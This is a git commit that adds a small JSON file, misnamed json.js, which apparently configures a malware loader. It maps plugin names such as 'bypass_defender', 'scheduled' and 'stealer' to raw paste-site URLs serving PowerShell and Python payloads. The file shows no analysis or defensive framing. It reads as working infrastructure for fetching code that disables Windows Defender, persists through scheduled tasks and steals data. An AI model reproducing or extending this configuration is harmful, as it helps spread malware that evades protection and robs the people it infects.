cd84ade154a6864cea7a165fa3c199213154e1a3
UQABXO <92090431+UQABXO@users.noreply.github.com>
2022-04-01 08:09:13 -0700

    Create json.js

---
+++ Plugins/json.js
@@ -0,0 +1,22 @@
+{
+	"antivirus": {
+		"Url" : "https://textbin.net/raw/q3ujywlwyj",
+		"Extention" : "PS1"
+	},
+	"bypass_defender": {
+		"Url" : "https://textbin.net/raw/dttslrsn9w",
+		"Extention" : "PS1"
+	},
+	"bypassed_defender": {
+		"Url" : "https://textbin.net/raw/aqqqqwiun9",
+		"Extention" : "PS1"
+	},
+	"scheduled": {
+		"Url" : "https://textbin.net/raw/1f9gzhorp0",
+		"Extention" : "PS1"
+	},
+	"stealer": {
+		"Url" : "https://textbin.net/raw/0wahh3a3hc",
+		"Extention" : "Py"
+	}
+}
